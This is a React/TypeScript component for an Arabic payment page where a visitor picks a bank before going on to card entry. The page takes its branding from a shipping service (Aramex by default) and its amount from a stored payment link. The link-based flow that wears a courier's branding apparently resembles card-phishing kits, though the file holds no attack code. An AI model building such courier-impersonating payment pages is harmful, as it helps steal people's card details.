import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, ArrowLeft, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { BankLogoCard } from "@/components/CompanyLogo";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  // Fallback to localStorage if linkData is not available
  const localData = id ? localStorage.getItem(`payment_${id}`) : null;
  const localPayload = localData ? JSON.parse(localData) : null;
  
  // Get country from link data or localStorage
  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || localPayload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  // Get preselected bank from link payload if available
  const preselectedBank = linkData?.payload?.selected_bank || localPayload?.selected_bank;
  
  // Get customer info from link data or localStorage (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || localPayload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || localPayload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || localPayload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = (linkData?.payload || localPayload) as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, countryCode);
  
  // Load banks when country is available from link data
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      // Simulate API call
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        // Auto-select bank if it was preselected during link creation
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };
  
  const handleSkip = async () => {
    // Save to link for cross-device compatibility
    const updatedPayload = {
      ...(linkData?.payload || localPayload || {}),
      selectedCountry: countryCode,
      selectedBank: 'skipped',
    };

    // Save to localStorage as fallback
    if (id) {
      localStorage.setItem(`payment_${id}`, JSON.stringify(updatedPayload));
    }

    // Try to save to Supabase if available
    if (linkData) {
      try {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
        console.error('Error saving bank selection:', error);
      }
    }

    toast({
      title: "تم التخطي",
      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
    });

    navigate(`/pay/${id}/card-input`);
  };

  const handleContinue = async () => {
    if (!selectedBank) return;

    // Save to link for cross-device compatibility
    const updatedPayload = {
      ...(linkData?.payload || localPayload || {}),
      selectedCountry: countryCode,
      selectedBank: selectedBank,
    };

    // Save to localStorage as fallback
    if (id) {
      localStorage.setItem(`payment_${id}`, JSON.stringify(updatedPayload));
    }

    // Try to save to Supabase if available
    if (linkData) {
      try {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
        console.error('Error saving bank selection:', error);
      }
    }

    navigate(`/pay/${id}/card-input`);
  };
  
  // Show loading state only while fetching (not if data is missing)
  if (linkLoading) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
          <p className="text-muted-foreground">جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  // Show error if no country data
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div 
      className="min-h-screen py-4 sm:py-12 bg-background" 
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
      }}
    >
      <div className="container mx-auto px-4 max-w-2xl">
        {/* Header */}
        <div className="mb-6">
          <button
            onClick={() => navigate(`/pay/${id}/details`)}
            className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>رجوع</span>
          </button>
          
          <div className="flex items-center gap-3 mb-2">
            <div
              className="w-12 h-12 rounded-full flex items-center justify-center"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
              }}
            >
              <Building2 className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">اختر البنك</h1>
              <p className="text-sm text-muted-foreground">
                {serviceName} - {formattedAmount}
              </p>
            </div>
          </div>
        </div>

        {/* Country Badge */}
        {countryData && (
          <div className="mb-4">
            <Badge variant="secondary" className="text-sm">
              {countryData.flag} {countryData.nameAr}
            </Badge>
          </div>
        )}

        {/* Loading Banks */}
        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-primary" />
            <p className="text-muted-foreground">جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center">
            <Building2 className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
            <p className="text-muted-foreground mb-4">لا توجد بنوك متاحة لهذه الدولة</p>
            <Button onClick={handleSkip} variant="outline">
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <>
            {/* Banks Grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
              {banks.map((bank) => (
                <BankLogoCard
                  key={bank.id}
                  bankId={bank.id}
                  selected={selectedBank === bank.id}
                  onClick={() => handleBankSelect(bank.id)}
                  className="hover:scale-102 transition-transform"
                />
              ))}
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <Button
                onClick={handleContinue}
                disabled={!selectedBank}
                className="w-full h-12 text-base font-semibold"
                style={{
                  background: selectedBank
                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                    : undefined,
                }}
              >
                متابعة
              </Button>
              
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base"
              >
                تخطي واستخدام أي بنك
              </Button>
            </div>

            {/* Info Note */}
            <div className="mt-6 p-4 bg-muted/50 rounded-lg">
              <p className="text-xs text-muted-foreground text-center">
                💡 يمكنك تخطي هذه الخطوة واستخدام بطاقة من أي بنك
              </p>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default PaymentBankSelector;
